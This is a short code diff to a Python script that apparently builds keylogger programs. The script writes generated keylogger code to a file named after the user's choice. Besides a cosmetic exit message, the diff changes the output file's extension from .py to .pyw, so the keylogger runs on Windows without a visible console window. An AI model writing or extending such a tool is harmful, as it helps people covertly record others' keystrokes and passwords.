@@ -3,6 +3,7 @@ import os
 import subprocess
 import signal
 import sys
+import time
 
 print(Fore.CYAN + "   ▄▄▄▄███▄▄▄▄    ▄██████▄     ▄████████    ▄████████    ▄████████ ")
 print(Fore.CYAN + " ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███   ███    ███ ")
@@ -23,6 +24,9 @@ print(Style.RESET_ALL)
 
 
 def signal_handler(signal, frame):
+  print("")
+  print("Bye!")
+  time.sleep(1)
   sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -105,7 +109,7 @@ with Listener(on_press=on_press) as listener:
 
 '''
 
-        f = open(F"{NameOfKeyLogger}.py", "w+")
+        f = open(F"{NameOfKeyLogger}.pyw", "w+")
         f.write(KeyLoggerCode)
         f.close()
 
